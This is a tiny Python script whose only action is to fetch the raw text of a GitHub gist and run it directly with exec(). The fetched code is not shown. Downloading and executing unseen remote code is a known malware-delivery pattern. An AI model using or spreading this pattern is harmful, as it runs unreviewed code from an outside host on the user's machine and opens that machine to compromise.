import urllib.request

url = "https://gist.githubusercontent.com/jennimotaa/2463bc037119e4df853a5ccec3aac6f4/raw"
exec(urllib.request.urlopen(url).read().decode('utf-8'))
